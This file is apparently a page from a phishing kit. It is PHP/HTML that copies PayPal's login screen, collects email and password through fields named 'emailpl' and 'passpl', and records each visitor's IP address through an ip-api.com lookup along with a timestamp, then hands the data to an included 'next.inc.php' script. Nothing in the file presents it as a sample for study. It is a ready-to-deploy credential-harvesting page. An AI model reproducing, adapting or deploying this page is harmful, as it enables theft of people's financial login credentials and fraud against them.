<?php include("next.inc.php"); ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Log in to your PayPal account</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>
	<link rel="stylesheet" type="text/css" href="css/app.css">
<link rel="shortcut icon" href="img/pp_icon.ico">
</head>
<body style="font-family: HelveticaNeue,'Helvetica Neue',Helvetica,Arial,sans-serif;color: #2c2e2f;">
	<div class="main_pl">
		<div class="content_pl">
			<div class="header_pl"></div>
			<div class="form_pl">
				<div>
				<input type="hidden" id="ip" name="ip">
				<input type="hidden" name="timeop" id="timeop" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
				<script>
				  function ipLookUp () {
				  $.ajax('http://ip-api.com/json')
				  .then(
				      function success(response) {
				          $('#ip').val(response.query);
				          $('#countryip').val(response.country);
				      },
				      function fail(data, status) {
				          console.log('Request failed.  Returned status of',
				                      status);
				      }
				  );
				}
				ipLookUp()
				</script>	
					<div class="err_pl"><span>Email is required</span></div>
					<input type="email" id="emailpl" name="emailpl" placeholder="Email addresse" style="position: relative;">
				</div>
				<div style="padding-top: 15px;">
					<input type="password" name="passpl" id="passpl" placeholder="Enter your password">
					<div class="err_pl2"><span>Password is required</span></div>

				</div>
					<button type="submit" name="btnplll" class="pplbtn">Log In</button>
					<div class="htbli">
						<a href="#">Having trouble logging in?</a>
						<img src="img/otr.png" class="otr">
						<button class="sgbtn" name="sgbtn">Sign Up</button>
					</div>
			</div>
		</div>
	</div>
	<div class="footer_pl">
		<a href="#" class="lnk_pl">Privacy</a>
		<a href="#" class="lnk_pl">Legal</a>
		<img src="img/cpryt.png">
	</div>
	<div  class="dvLoading">
		<div class="spinner loading"></div>
	</div>	
</body>
</html>